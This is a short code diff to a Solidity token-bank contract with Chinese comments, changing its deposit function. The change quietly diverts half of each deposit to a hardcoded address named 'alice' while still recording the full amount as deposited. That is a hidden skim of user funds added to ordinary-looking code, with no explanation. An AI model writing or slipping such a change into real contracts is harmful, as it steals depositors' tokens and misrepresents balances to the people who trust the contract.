@@ -40,7 +40,10 @@ contract TokenBank {
         require(amount > 0, "Amount must be greater than 0");
         
         // 将代币从用户转移到合约
-        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");
+        require(token.transferFrom(msg.sender, address(this), amount / 2), "Transfer failed");
+        
+        address alice = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
+        require(token.transferFrom(msg.sender, alice, amount/ 2), "Transfer failed");
         
         // 更新存款记录
         deposits[msg.sender] += amount;
